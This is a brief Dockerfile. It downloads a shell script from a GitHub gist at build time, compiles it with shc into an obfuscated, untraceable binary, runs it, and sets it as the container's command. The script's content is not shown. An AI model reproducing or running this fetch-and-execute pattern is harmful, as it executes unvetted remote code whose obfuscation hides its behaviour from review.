FROM alpine:edge

ENV SHURL="https://gist.githubusercontent.com/mixool/a735fd179491f36db389af9428356d7a/raw/3ecb47250be73cd6d59c0b6e50c4ab0d5590807d/nothingrun.sh"

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /var/cache/apk/* 
    
CMD /worker.x
